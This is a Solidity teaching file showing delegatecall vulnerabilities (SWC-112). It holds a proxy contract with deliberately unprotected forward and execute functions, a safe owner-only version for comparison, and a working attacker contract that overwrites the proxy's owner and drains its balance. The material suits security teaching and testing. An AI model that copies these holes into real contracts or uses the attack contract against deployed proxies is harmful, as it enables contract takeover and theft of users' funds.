// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

/**
 * @title UnsafeProxy
 * @notice This contract demonstrates delegatecall vulnerabilities.
 * 
 * DO NOT USE IN PRODUCTION - This is intentionally vulnerable!
 */
contract UnsafeProxy {
    address public owner;
    address public implementation;

    constructor(address _implementation) {
        owner = msg.sender;
        implementation = _implementation;
    }

    // ================================================================
    // VULNERABILITY: Unsafe Delegatecall (SWC-112)
    // Target address is user-controlled without access control
    // ================================================================
    function forward(address target, bytes calldata data) external returns (bytes memory) {
        // Anyone can execute arbitrary code in this contract's context!
        (bool success, bytes memory result) = target.delegatecall(data);
        require(success, "Delegatecall failed");
        return result;
    }

    // ================================================================
    // VULNERABILITY: Unsafe Delegatecall with state corruption risk
    // Even though implementation is set, anyone can call
    // ================================================================
    function execute(bytes calldata data) external returns (bytes memory) {
        (bool success, bytes memory result) = implementation.delegatecall(data);
        require(success, "Delegatecall failed");
        return result;
    }

    // ================================================================
    // SAFE VERSION: Proper access control
    // ================================================================
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function safeExecute(bytes calldata data) external onlyOwner returns (bytes memory) {
        (bool success, bytes memory result) = implementation.delegatecall(data);
        require(success, "Delegatecall failed");
        return result;
    }

    function upgradeImplementation(address newImplementation) external onlyOwner {
        require(newImplementation != address(0), "Invalid address");
        implementation = newImplementation;
    }
}

/**
 * @title MaliciousImplementation
 * @notice Example of how an attacker could exploit the proxy
 */
contract MaliciousImplementation {
    // Storage layout must match proxy for attack to work
    address public owner;
    address public implementation;

    // This function will overwrite the proxy's owner!
    function attack() external {
        owner = msg.sender;
    }

    // This could drain all funds
    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

